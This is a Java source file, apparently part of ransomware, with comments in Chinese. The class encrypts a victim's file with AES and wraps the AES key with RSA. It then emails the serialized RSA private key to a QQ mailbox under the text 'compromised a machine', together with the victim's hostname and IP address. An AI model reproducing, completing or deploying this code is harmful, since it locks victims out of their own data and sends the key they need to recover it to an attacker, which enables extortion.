package com.encrypt;

import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPrivateKey;
import java.security.spec.InvalidKeySpecException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

import org.apache.commons.codec.binary.Base64;

import com.utils.Utils;

public class RSAEncryptAES {
	private RSADemo rsa = null;
	private AESDemo aes = null;
	private static RSAEncryptAES rsaEncryptAES = new RSAEncryptAES();//单例模式
	public static RSAEncryptAES getRSAEncryptAES()
	{
		return rsaEncryptAES;
	}
	private RSAEncryptAES()
	{
		/*****初始化******/
		rsa = new RSADemo();
		aes = new AESDemo();
		try {
			aes.initAESCipher(true);
		} catch (InvalidKeyException | NoSuchAlgorithmException
				| NoSuchPaddingException e) {
			e.printStackTrace();
		}
		try {
			rsa.initRSACipher(true);
		} catch (NoSuchAlgorithmException | NoSuchPaddingException
				| InvalidKeySpecException | ClassNotFoundException
				| IOException e) {
			e.printStackTrace();
		}
	}
	/*
	 * 加密模块
	 */
	public void encrypt(File sourceFile) throws InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, NoSuchAlgorithmException, NoSuchPaddingException, AddressException, MessagingException
	{
		
	//	File sourceFile = new File("D:\\jdk.exe");
		if(!sourceFile.exists())
		{
			System.out.println("待加密文件不存在!");
			return ;
		}
		/*********AES加密文件***********/
		
		SecretKey aesKey = aes.getAESKey();
		System.out.println("解密前AES密钥为：" + Base64.encodeBase64String(aesKey.getEncoded()));
		rsa.encryptAESKey(sourceFile, aesKey);
		aes.encryptFile(sourceFile, true);
		System.out.println("AES加密文件完成！");
		
	}
	
	public void sendRSAPrivateKeyToQQMail() throws IOException, AddressException, MessagingException
	{
		RSAPrivateKey privateKey = rsa.getRSAPrivateKey();
		File serializeFile = rsa.getRSAPrivateKeySerialize();
		System.out.println("RSA私钥序列化文件为:" + serializeFile.getPath());
		SendRSAPrivateKey sendRSAPrivateKey = new SendRSAPrivateKey();
		sendRSAPrivateKey.sendQQMail("RSA私钥", "攻陷一台机器，主机名：" + Utils.getLocalHostName() + "   IP:" + Utils.getLocalIp(), serializeFile);
	    System.out.println("RSA私钥文件已经发送到服务器");
		
	}

}
